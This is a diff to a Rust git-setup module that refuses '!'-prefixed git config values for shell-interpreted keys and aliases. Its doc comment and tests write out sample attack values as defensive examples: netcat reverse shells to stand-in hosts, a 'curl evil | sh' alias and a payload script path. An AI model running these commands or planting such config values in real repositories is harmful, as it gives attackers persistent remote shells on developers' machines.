@@ -22,6 +22,42 @@ pub enum GitError {
     #[error("Signing key not found: {0}")]
     #[allow(dead_code)] // Reserved for future validation
     SigningKeyNotFound(String),
+
+    /// A `[git]` config value was refused because git would interpret it as a
+    /// shell command. The classic exploit:
+    ///
+    ///   [git]
+    ///   credential_helper = "!nc attacker.tld 4444 -e /bin/sh"
+    ///
+    /// Git's `!`-prefix syntax executes the value as a shell command on every
+    /// `git push` / `git commit`, persisting RCE outside Jarvy's control window.
+    /// We refuse `!`-prefixed values for the security-sensitive keys
+    /// (`credential.helper`, `core.editor`, `core.pager`, `core.sshCommand`)
+    /// and for any `alias.*` unless `JARVY_ALLOW_SHELL_ALIASES=1` is set.
+    #[error("Refused dangerous git config '{0}': {1}")]
+    RefusedDangerousConfig(String, String),
+}
+
+/// Git config keys whose values git interprets as shell commands when the
+/// value begins with `!`. A malicious `jarvy.toml` can use any of these to
+/// stage persistent RCE on every `git push` / `git commit`.
+const GIT_SHELL_INTERPRETED_KEYS: &[&str] = &[
+    "credential.helper",
+    "core.editor",
+    "core.pager",
+    "core.sshCommand",
+    // sequence.editor, mergetool/difftool also accept ! values; keep narrow
+    // for now and grow if a real user pattern needs it.
+];
+
+/// Returns true if the given value would be executed as a shell command by
+/// git when stored under one of the shell-interpreted config keys.
+fn value_is_shell_escape(value: &str) -> bool {
+    // Git treats values starting with `!` as shell. Leading whitespace is
+    // not stripped by git, so `" !cmd"` is NOT a shell value — but the
+    // attacker has no reason to add leading whitespace, so reject the
+    // common form.
+    value.starts_with('!')
 }
 
 /// Git setup handler
@@ -201,6 +237,46 @@ impl GitSetup {
 
     /// Set a single git config value
     fn set_config(&self, key: &str, value: &str) -> Result<(), GitError> {
+        // Refuse `!`-prefixed values for keys git interprets as shell.
+        // See `RefusedDangerousConfig` for the threat model.
+        if value_is_shell_escape(value) {
+            let is_alias = key.starts_with("alias.");
+            let is_shell_key = GIT_SHELL_INTERPRETED_KEYS.contains(&key);
+            if is_shell_key {
+                tracing::warn!(
+                    event = "git.config.refused_shell_escape",
+                    key = %key,
+                    "refused git config value starting with `!` for shell-interpreted key"
+                );
+                return Err(GitError::RefusedDangerousConfig(
+                    key.to_string(),
+                    "values starting with `!` are interpreted by git as a shell command; \
+                     refusing to set this from jarvy.toml"
+                        .to_string(),
+                ));
+            }
+            if is_alias {
+                let allow = std::env::var("JARVY_ALLOW_SHELL_ALIASES")
+                    .map(|v| {
+                        v == "1" || v.eq_ignore_ascii_case("true") || v.eq_ignore_ascii_case("yes")
+                    })
+                    .unwrap_or(false);
+                if !allow {
+                    tracing::warn!(
+                        event = "git.config.refused_shell_alias",
+                        alias = %key,
+                        "refused git alias starting with `!` (set JARVY_ALLOW_SHELL_ALIASES=1 to allow)"
+                    );
+                    return Err(GitError::RefusedDangerousConfig(
+                        key.to_string(),
+                        "git aliases starting with `!` execute as shell on `git <alias>`; \
+                         set JARVY_ALLOW_SHELL_ALIASES=1 to allow"
+                            .to_string(),
+                    ));
+                }
+            }
+        }
+
         let scope_flag = match self.config.scope {
             ConfigScope::Global => "--global",
             ConfigScope::Local => "--local",
@@ -306,5 +382,52 @@ mod tests {
         assert_eq!(AutoCrlf::True.as_str(), "true");
         assert_eq!(AutoCrlf::False.as_str(), "false");
         assert_eq!(AutoCrlf::Input.as_str(), "input");
+    }
+
+    #[test]
+    fn value_is_shell_escape_detects_bang_prefix() {
+        assert!(value_is_shell_escape("!nc attacker 4444 -e /bin/sh"));
+        assert!(value_is_shell_escape("!"));
+        assert!(!value_is_shell_escape("/usr/bin/vim"));
+        assert!(!value_is_shell_escape("osxkeychain"));
+        assert!(!value_is_shell_escape("checkout"));
+    }
+
+    #[test]
+    fn set_config_refuses_bang_credential_helper() {
+        // Build a setup that won't actually invoke git (we hit the refusal
+        // before the Command::output call).
+        let cfg = GitConfig::default();
+        let setup = GitSetup::new(cfg);
+        let err = setup
+            .set_config("credential.helper", "!nc evil 4444 -e /bin/sh")
+            .unwrap_err();
+        match err {
+            GitError::RefusedDangerousConfig(k, _) => assert_eq!(k, "credential.helper"),
+            other => panic!("expected RefusedDangerousConfig, got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn set_config_refuses_bang_core_editor() {
+        let setup = GitSetup::new(GitConfig::default());
+        assert!(matches!(
+            setup.set_config("core.editor", "!/tmp/payload.sh"),
+            Err(GitError::RefusedDangerousConfig(_, _))
+        ));
+    }
+
+    #[test]
+    fn set_config_refuses_bang_alias_without_env_opt_in() {
+        // Ensure env not set; this test is racy with parallel tests setting
+        // the same var, so we just refuse to assert if it happens to be set.
+        if std::env::var("JARVY_ALLOW_SHELL_ALIASES").is_ok() {
+            return;
+        }
+        let setup = GitSetup::new(GitConfig::default());
+        assert!(matches!(
+            setup.set_config("alias.x", "!curl evil | sh"),
+            Err(GitError::RefusedDangerousConfig(_, _))
+        ));
     }
 }
